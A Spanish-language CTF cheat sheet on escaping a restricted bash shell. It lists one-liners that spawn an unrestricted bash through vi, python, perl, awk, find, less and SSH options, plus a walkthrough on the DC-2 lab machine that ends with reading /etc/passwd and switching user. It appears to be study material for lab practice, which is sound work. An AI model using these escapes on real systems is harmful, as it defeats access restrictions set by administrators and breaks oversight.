# Escape de rbash (Restricted Bash)

## Descripción

**rbash** (restricted bash) es una shell de Linux con capacidades limitadas que los administradores usan para restringir lo que puede hacer un usuario. Es común encontrarla en CTFs como capa de seguridad adicional después de obtener acceso SSH.

---

## Síntomas de estar en rbash

```bash
-rbash: cat: command not found
-rbash: su: command not found
-rbash: cd: restricted
-rbash: PATH: readonly variable
-rbash: /bin/bash: restricted: cannot specify `/' in command names
```

El síntoma más claro es que comandos básicos como `cat`, `cd` o `su` no funcionan, y que el PATH es de solo lectura.

---

## Cómo funciona rbash

rbash limita al usuario a ejecutar solo los binarios disponibles en un directorio específico (normalmente `/home/usuario/bin/` o similar). Los binarios disponibles se comprueban con:

```shell
ls ~/bin/
ls ~/usr/bin/
echo $PATH
```

---

## Métodos de escape

### Método 1 — vi/vim ⭐ (más fiable)

vi es un editor que puede lanzar shells. Si está disponible:

```shell
vi
```

Dentro de vi (en modo comando — pulsa Esc primero si estás en modo inserción):

```
:set shell=/bin/sh
:shell
```

O directamente:

```
:!/bin/bash
```

Esto lanza una shell que no está restringida por rbash.

**Desde `/bin/sh` obtener bash completo:**

```shell
/bin/bash
```

**Arreglar el PATH:**

```shell
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

### Método 2 — SSH con shell alternativa

Al conectarse por SSH especificar la shell directamente:

```shell
ssh usuario@TARGET -p PUERTO -t "bash --noprofile --norc"
ssh usuario@TARGET -p PUERTO -t "/bin/sh"
```

### Método 3 — Python

```shell
python -c 'import os; os.system("/bin/bash")'
python3 -c 'import os; os.system("/bin/bash")'
```

### Método 4 — Perl

```shell
perl -e 'exec "/bin/bash"'
```

### Método 5 — awk

```shell
awk 'BEGIN {system("/bin/bash")}'
```

### Método 6 — find

```shell
find / -name bash -exec {} \;
```

### Método 7 — less/more

```shell
less /etc/passwd
# Dentro de less escribir:
!/bin/bash
```

### Método 8 — BASH_ENV via SSH

```shell
ssh usuario@TARGET -p PUERTO -t "env BASH_ENV=/dev/null bash --norc --noprofile"
```

---

## Después de escapar — pasos obligatorios

Una vez escapado rbash, siempre ejecutar:

```shell
# 1. Lanzar bash completo si estás en sh
/bin/bash

# 2. Arreglar el PATH
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# 3. Arreglar la variable SHELL
export SHELL=/bin/bash

# 4. Verificar
whoami
id
cat /etc/passwd
```

---

## Checklist de escape

```
[ ] ¿Está vi disponible? → :set shell=/bin/sh → :shell
[ ] ¿Está python/python3? → python -c 'import os; os.system("/bin/bash")'
[ ] ¿Está perl? → perl -e 'exec "/bin/bash"'
[ ] ¿Está awk? → awk 'BEGIN {system("/bin/bash")}'
[ ] ¿Está less/more? → !/bin/bash dentro del paginador
[ ] ¿SSH disponible? → conectar con -t "bash --noprofile"
[ ] Después del escape → arreglar PATH siempre
```

---

## Por qué es importante arreglar el PATH

Cuando escapas rbash, la variable PATH sigue siendo la restrictiva. Por eso comandos como `cat`, `whoami` o `su` siguen sin funcionar aunque ya tengas bash. Al exportar el PATH completo, el sistema sabe dónde buscar los binarios del sistema.

```shell
# PATH restrictivo (solo permite lo que estaba en ~/bin)
echo $PATH
# /home/tom/usr/bin

# PATH completo del sistema
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
echo $PATH
# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Ahora funcionan todos los comandos
cat /etc/passwd  ✅
whoami           ✅
su jerry         ✅
```

---

## Ejemplo real — Máquina DC-2

Tom tenía rbash configurada. Los únicos comandos disponibles eran `ls`, `vi` y pocos más.

```shell
# Dentro de la sesión SSH de tom
vi flag3.txt

# Dentro de vi:
:set shell=/bin/sh
:shell

# Ahora en /bin/sh — lanzar bash
/bin/bash

# Arreglar PATH
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Verificar
whoami
# tom — bash completo ✅

# Ahora sí funciona su
su jerry
```
